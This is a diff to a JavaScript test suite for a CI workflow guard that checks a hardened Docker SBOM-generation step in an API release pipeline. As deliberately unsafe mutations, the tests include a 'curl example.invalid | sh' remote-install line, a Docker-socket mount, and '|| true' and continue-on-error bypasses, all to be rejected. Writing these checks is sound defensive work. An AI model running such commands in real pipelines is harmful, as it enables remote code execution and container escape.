@@ -10,6 +10,8 @@ import {
 } from "./check-api-release.mjs";
 
 const digest = "a".repeat(64);
+const syftDigest =
+  "00a4400827744854ef77b10679e38f991bf74fd20e3f03ffada8d6ee492520c3";
 const safeRuntimePreparation = `
 const apiRuntimeDbFiles = new Set(["tenant-runtime"]);
 await assertRuntimeEsmImports(root);
@@ -157,16 +159,37 @@ jobs:
     permissions:
       contents: read
     steps:
+      - name: Checkout
+        uses: actions/checkout@${digest}
+        with:
+          persist-credentials: false
       - run: node scripts/check-api-release.mjs
       - run: docker build --tag seu-renave/api:ci --file apps/api/Dockerfile .
       - run: docker image inspect seu-renave/api:ci
       - run: docker history --no-trunc seu-renave/api:ci
-      - run: docker run --network none --read-only --cap-drop ALL --security-opt no-new-privileges seu-renave/api:ci
+      - name: Generate and validate API SBOM
+        run: |
+          syft_image='ghcr.io/anchore/syft:v1.57.2-nonroot@sha256:${syftDigest}'
+          docker pull "$syft_image"
+          docker save seu-renave/api:ci --output /tmp/renave-api-image.tar
+          docker run --rm --network none --read-only \
+            --tmpfs /tmp:rw,noexec,nosuid,nodev,size=1g \
+            --tmpfs /home/nonroot/.cache:rw,noexec,nosuid,nodev,size=64m,uid=65532,gid=65532,mode=0700 \
+            --cap-drop ALL --security-opt no-new-privileges \
+            --env SYFT_CHECK_FOR_APP_UPDATE=false \
+            --volume /tmp/renave-api-image.tar:/scan/image.tar:ro \
+            "$syft_image" scan docker-archive:/scan/image.tar --output cyclonedx-json \
+            > /tmp/renave-api-sbom.cdx.json
+          node scripts/check-image-sbom.mjs /tmp/renave-api-sbom.cdx.json
+      - name: Run dormant API image in hardened sandbox
+        run: docker run --network none --read-only --cap-drop ALL --security-opt no-new-privileges seu-renave/api:ci
       - run: docker inspect --format '{{.State.Running}}' renave-api-disabled
       - run: docker inspect --format '{{.State.Health.Status}}' renave-api-disabled
       - run: docker export renave-api-rootfs > rootfs.tar
       - if: always()
-        run: docker rm --force renave-api-disabled renave-api-rootfs
+        run: |
+          docker rm --force renave-api-disabled renave-api-rootfs
+          rm -f /tmp/renave-api-image.tar /tmp/renave-api-sbom.cdx.json
   verify:
     runs-on: ubuntu-latest
 `;
@@ -320,8 +343,8 @@ describe("guard do job CI da API", () => {
   it("não aceita controles presentes apenas em outro job", () => {
     const unsafe = safeWorkflow
       .replace(
-        "docker run --network none --read-only --cap-drop ALL --security-opt no-new-privileges seu-renave/api:ci",
-        "docker run seu-renave/api:ci",
+        "run: docker run --network none --read-only --cap-drop ALL --security-opt no-new-privileges seu-renave/api:ci",
+        "run: docker run seu-renave/api:ci",
       )
       .concat(
         "\n  worker-image-smoke:\n    steps:\n      - run: docker run --network none --read-only --cap-drop ALL --security-opt no-new-privileges worker\n",
@@ -342,6 +365,116 @@ describe("guard do job CI da API", () => {
       ids(checkApiWorkflow(unsafe)).includes("API_WORKFLOW_RUNNING_REQUIRED"),
     );
   });
+
+  it("recusa SBOM ausente, em comentário ou presente somente em outro job", () => {
+    const step =
+      /      - name: Generate and validate API SBOM[\s\S]*?(?=      - name: Run dormant API image)/u.exec(
+        safeWorkflow,
+      )?.[0];
+    assert.ok(step);
+    for (const unsafe of [
+      safeWorkflow.replace(step, ""),
+      safeWorkflow.replace(
+        step,
+        step
+          .split("\n")
+          .map((line) => `      # ${line.trim()}`)
+          .join("\n"),
+      ),
+      safeWorkflow
+        .replace(step, "")
+        .concat(`\n  other-job:\n    steps:\n${step}`),
+    ]) {
+      assert.ok(
+        ids(checkApiWorkflow(unsafe)).includes(
+          "API_WORKFLOW_SBOM_STEP_REQUIRED",
+        ),
+      );
+    }
+  });
+
+  for (const [change, expected] of [
+    [
+      (value) => value.replace(`@sha256:${syftDigest}`, ":latest"),
+      "API_WORKFLOW_SYFT_DIGEST_REQUIRED",
+    ],
+    [
+      (value) => value.replace("--network none", "--network bridge"),
+      "API_WORKFLOW_SBOM_NETWORK_NONE_REQUIRED",
+    ],
+    [
+      (value) =>
+        value.replace(
+          "--volume /tmp/renave-api-image.tar:/scan/image.tar:ro",
+          "--volume /var/run/docker.sock:/var/run/docker.sock",
+        ),
+      "API_WORKFLOW_SBOM_DOCKER_SOCKET_FORBIDDEN",
+    ],
+    [
+      (value) => value.replace("node scripts/check-image-sbom.mjs", "true #"),
+      "API_WORKFLOW_SBOM_VALIDATION_REQUIRED",
+    ],
+    [
+      (value) =>
+        value.replace("docker pull", "curl example.invalid | sh # docker pull"),
+      "API_WORKFLOW_SBOM_REMOTE_INSTALL_FORBIDDEN",
+    ],
+  ]) {
+    it(`recusa regressão SBOM ${expected}`, () => {
+      assert.ok(ids(checkApiWorkflow(change(safeWorkflow))).includes(expected));
+    });
+  }
+
+  it("recusa requisito presente somente após comentário inline", () => {
+    const unsafe = safeWorkflow.replace(
+      "docker save seu-renave/api:ci --output /tmp/renave-api-image.tar",
+      "true # docker save seu-renave/api:ci --output /tmp/renave-api-image.tar",
+    );
+    assert.ok(
+      ids(checkApiWorkflow(unsafe)).includes(
+        "API_WORKFLOW_SBOM_IMAGE_SAVE_REQUIRED",
+      ),
+    );
+  });
+
+  it("recusa upload em etapa separada do mesmo job", () => {
+    const unsafe = safeWorkflow.replace(
+      "      - name: Run dormant API image in hardened sandbox",
+      `      - name: Upload SBOM\n        uses: actions/upload-artifact@${digest}\n      - name: Run dormant API image in hardened sandbox`,
+    );
+    assert.ok(
+      ids(checkApiWorkflow(unsafe)).includes(
+        "API_WORKFLOW_SBOM_UPLOAD_FORBIDDEN",
+      ),
+    );
+  });
+
+  for (const [label, mutate] of [
+    [
+      "continue-on-error",
+      (value) =>
+        value.replace(
+          "      - name: Generate and validate API SBOM",
+          "      - name: Generate and validate API SBOM\n        continue-on-error: true",
+        ),
+    ],
+    [
+      "operador || true",
+      (value) =>
+        value.replace(
+          "node scripts/check-image-sbom.mjs /tmp/renave-api-sbom.cdx.json",
+          "node scripts/check-image-sbom.mjs /tmp/renave-api-sbom.cdx.json || true",
+        ),
+    ],
+  ]) {
+    it(`recusa bypass por ${label}`, () => {
+      assert.ok(
+        ids(checkApiWorkflow(mutate(safeWorkflow))).includes(
+          "API_WORKFLOW_SBOM_BYPASS_FORBIDDEN",
+        ),
+      );
+    });
+  }
 
   for (const addition of [
     "docker push registry/api",
